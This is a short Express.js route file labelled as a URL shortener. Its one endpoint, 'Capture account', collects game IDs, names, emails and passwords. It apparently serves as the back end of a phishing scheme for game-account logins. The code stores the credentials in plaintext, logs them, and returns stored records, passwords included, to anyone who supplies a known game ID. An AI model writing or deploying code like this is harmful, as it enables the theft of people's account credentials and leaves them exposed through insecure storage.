// shorten long urls
const express = require('express');
const router = express.Router();
const config = require('config');

const Account = require('../models/Account');

function isEmpty(str) {
    return (!str || 0 === str.length);
}

function isBlank(str) {
    return (!str || /^\s*$/.test(str));
}

// @route   POST /cap/acc
// @desc    Capture account
router.post('/acc', async (req, res) => {
    const { ingameID, ingameName, accEmail, accPass } = req.body;

    if (isEmpty(accEmail) || isEmpty(accPass) ||
        isBlank(accEmail) || isBlank(accPass)) {
        res.status(401).json('Invalid input data');
    } else {
        try {
            let account = await Account.findOne({ ingameID });

            if (account) {
                res.json(account);
            } else {
                account = new Account({
                    ingameID,
                    ingameName,
                    accEmail,
                    accPass,
                    date: new Date()
                });
                console.log(account);
    
                await account.save();
            }
        } catch (error) {
            console.error(error);
            res.status(500).json('Server Error');
        }
    }
});

module.exports = router;